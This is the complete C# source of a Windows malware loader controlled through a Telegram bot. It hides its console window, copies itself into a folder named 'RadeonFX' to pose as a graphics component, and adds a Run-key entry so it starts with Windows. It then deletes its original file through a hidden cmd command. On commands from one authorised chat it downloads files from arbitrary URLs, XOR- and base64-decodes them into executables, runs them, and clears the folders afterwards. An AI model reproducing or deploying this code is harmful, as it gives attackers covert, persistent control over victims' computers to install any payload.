using System;
using System.IO;
using System.Net;
using Microsoft.Win32;
using System.Text;
using System.Diagnostics;
using System.Linq;
using Telegram.Bot;
using Telegram.Bot.Args;
using System.Runtime.InteropServices;
using System.Threading;

class Program
{
    private static TelegramBotClient botClient;
    private static string wolfFolderPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "wolf");
    private static string foxyFolderPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Foxy");
    private static long allowedChatId = 2126266344; // Move the variable outside Main
    private static string identifierFolderPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "IDFolder");
    private static string identifierFilePath = Path.Combine(identifierFolderPath, "identifier.txt");

    [DllImport("kernel32.dll")]
    private static extern bool FreeConsole();

    [DllImport("user32.dll")]
    private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    private const int SW_HIDE = 0;
    private static ManualResetEvent manualResetEvent = new ManualResetEvent(false);


    static void Main()
    {
        FreeConsole();

        // Check if the program is running in the specified folder
        if (IsRunningInRadeonFXFolder())
        {
            InitializeFolders();
            StartBot();
        }
        else
        {
            // Copy the program to the specified folder
            CopyToRadeonFXFolder();

            // Add to startup
            AddToStartup();

            // Start a new process to delete the original program
            StartDeletionProcess();

        }

    }

    private static string ReadOrCreateIdentifier()
    {
        string identifier;

        if (File.Exists(identifierFilePath))
        {
            // Read identifier from the file
            identifier = File.ReadAllText(identifierFilePath);
        }
        else
        {
            // Generate a new identifier and save it to the file
            identifier = GenerateRandomIdentifier();
            File.WriteAllText(identifierFilePath, identifier);
        }

        return identifier;
    }

    private static string GenerateRandomIdentifier()
    {
        Random random = new Random();
        return random.Next(100, 1000).ToString(); // Generate a 3-digit number
    }

    private static void SendWelcomeMessage(string identifier)
    {
        long chatId = allowedChatId; // Use the specified chatId or modify accordingly
        botClient.SendTextMessageAsync(chatId, $"Program has been opened, identifier is {identifier}");
    }


    private static bool IsRunningInRadeonFXFolder()
    {
        string currentFolderPath = Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location);
        return currentFolderPath.Equals(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "RadeonFX"), StringComparison.OrdinalIgnoreCase);
    }

    private static void CopyToRadeonFXFolder()
    {
        string destinationFolder = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "RadeonFX");
        if (!Directory.Exists(destinationFolder))
        {
            Directory.CreateDirectory(destinationFolder);
        }

        string destinationPath = Path.Combine(destinationFolder, Path.GetFileName(System.Reflection.Assembly.GetExecutingAssembly().Location));
        File.Copy(System.Reflection.Assembly.GetExecutingAssembly().Location, destinationPath, true);
    }

    private static void AddToStartup()
    {
        using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
        {
            key.SetValue("RadeonFX", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "RadeonFX", Path.GetFileName(System.Reflection.Assembly.GetExecutingAssembly().Location)));
        }
    }

    private static void StartDeletionProcess()
    {
        string copiedExecutablePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "RadeonFX", Path.GetFileName(System.Reflection.Assembly.GetExecutingAssembly().Location));

        // Start a new process to run the copied executable and delete the original program
        Process.Start(new ProcessStartInfo
        {
            FileName = "cmd.exe",
            Arguments = $"/C start \"\" \"{copiedExecutablePath}\" & ping 127.0.0.1 -n 2 > nul & del \"{System.Reflection.Assembly.GetExecutingAssembly().Location}\"",
            CreateNoWindow = true,
            WindowStyle = ProcessWindowStyle.Hidden,
            UseShellExecute = false
        });

        Environment.Exit(0); // Exit the original process
    }

    private static void StartBot()
    {
        InitializeFolders();

        string telegramBotToken = "here goes your bot token";

        botClient = new TelegramBotClient(telegramBotToken);
        botClient.OnMessage += Bot_OnMessage;
        botClient.StartReceiving();

        manualResetEvent.WaitOne();
    }

    private static void InitializeFolders()
    {
        if (!Directory.Exists(identifierFolderPath))
        {
            Directory.CreateDirectory(identifierFolderPath);
        }

        if (!Directory.Exists(wolfFolderPath))
        {
            Directory.CreateDirectory(wolfFolderPath);
        }

        if (!Directory.Exists(foxyFolderPath))
        {
            Directory.CreateDirectory(foxyFolderPath);
        }
    }

    private static void Bot_OnMessage(object sender, MessageEventArgs e)
    {
        if (e.Message.Chat.Id != allowedChatId)
        {
            return; // Ignore messages from unauthorized chats
        }



        string[] commandParts = e.Message.Text.Split('_');
        string command = commandParts[0].ToLower();
        
        try
        {
            switch (command)
            {
                case "/deploy":
                    if (commandParts.Length == 3)
                    {
                        DeployPackage(commandParts[1], commandParts[2]);
                    }

                    break;

                case "/runpackage":
                    if (commandParts.Length == 3)
                    {
                        RunPackage(commandParts[1], commandParts[2]);
                    }

                    break;

                case "/cleanrunners":
                    CleanFoxyFolder();
                    break;

                case "/cleanwolf":
                    CleanWolfFolder();
                    break;

                case "/seeid":
                    SeeID();
                    break;

                case "/help":
                    SendHelpMessage(e.Message.Chat.Id);
                    break;
            }
        }
        catch (Exception exception)
        {
            SendErrorMessage(e.Message.Chat.Id, $"An error occurred: {exception.Message}");
        }
    }

    private static void SeeID()
    {
        // Read or generate the identifier
        string identifier = ReadOrCreateIdentifier();

        // Send welcoming message with the identifier
        SendWelcomeMessage(identifier);
    }
    private static void DeployPackage(string packageName, string packageLink)
    {
        string wolfFilePath = Path.Combine(wolfFolderPath, packageName + ".awo");
        DownloadFile(packageLink, wolfFilePath);
    }

    private static void DownloadFile(string url, string filePath)
    {
        using (var client = new WebClient())
        {
            client.DownloadFile(url, filePath);
        }
    }

    private static void RunPackage(string packageName, string xorKey)
    {
        string wolfFilePath = Path.Combine(wolfFolderPath, packageName + ".awo");

        // Read encrypted data from file
        byte[] encryptedData = File.ReadAllBytes(wolfFilePath);

        // Decode using XOR and the provided key
        byte[] decryptedData = XorDecode(encryptedData, xorKey);

        // Convert base64 to binary
        string base64String = Encoding.UTF8.GetString(decryptedData);
        byte[] binaryData = Convert.FromBase64String(base64String);

        // Move to Foxy folder and run
        string foxyFilePath = Path.Combine(foxyFolderPath, packageName + ".exe");
        File.WriteAllBytes(foxyFilePath, binaryData);

        // Run the file
        Process.Start(foxyFilePath);
    }

    private static byte[] XorDecode(byte[] data, string key)
    {
        byte[] keyBytes = Encoding.UTF8.GetBytes(key);
        byte[] decodedData = new byte[data.Length];

        for (int i = 0; i < data.Length; i++)
        {
            decodedData[i] = (byte)(data[i] ^ keyBytes[i % keyBytes.Length]);
        }

        return decodedData;
    }



    private static void CleanFoxyFolder()
    {
        if (Directory.Exists(foxyFolderPath))
        {
            Directory.GetFiles(foxyFolderPath).ToList().ForEach(File.Delete);
        }
        else
        {
            Console.WriteLine("Foxy folder could not be found.");
        }
    }

    private static void CleanWolfFolder()
    {
        if (Directory.Exists(wolfFolderPath))
        {
            Directory.GetFiles(wolfFolderPath).ToList().ForEach(File.Delete);
        }
        else
        {
            Console.WriteLine("Wolf folder could not be found.");
        }
    }
    private static void SendHelpMessage(long chatId)
    {
        string helpMessage = "Available commands:\n" +
                             "/deploy_PackageName_PackageLink\n" +
                             "/runpackage_PackageName_DecryptKey\n" +
                             "/cleanrunners\n" +
                             "/cleanwolf\n" +
                             "/seeid for available ids\n" +
                             "/help";

        botClient.SendTextMessageAsync(chatId, helpMessage);
    }
    private static void SendErrorMessage(long chatId, string errorMessage)
    {
        botClient.SendTextMessageAsync(chatId, $"Error: {errorMessage}");
    }
}
